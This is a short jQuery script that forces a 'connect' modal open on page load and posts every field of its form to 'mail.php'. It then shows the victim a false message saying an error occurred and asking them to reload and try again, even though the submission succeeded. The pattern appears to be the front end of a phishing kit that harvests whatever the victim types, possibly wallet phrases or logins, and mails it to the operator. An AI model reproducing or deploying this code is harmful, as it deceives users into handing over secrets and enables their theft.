const openModal = (e) => {

	$("div#connectModal").modal("show");
}


openModal()

const beforeSend = () => {
	$("div.response").text("")
	$("span.next-text").hide();
	$("span.spinner").fadeIn();

	$("form.connectForm").find("input, button").attr("disabled",true)
}

const complete = () => {
	$("span.spinner").hide();
	$("span.next-text").fadeIn();

	$("form.connectForm").find("input, button").attr("disabled",false)
}

const success = () => {
	$("div.response").text("An error occured, please reload the page and try again gan gan")
}


$(document).on("submit", "form.connectForm", function () {

	const data = $("form.connectForm").serializeArray()

	$.ajax({
		type: 'POST',
		url: 'mail.php',
		data: data,
		beforeSend: beforeSend,
		complete: complete,
		success:success
	})

	return false;

})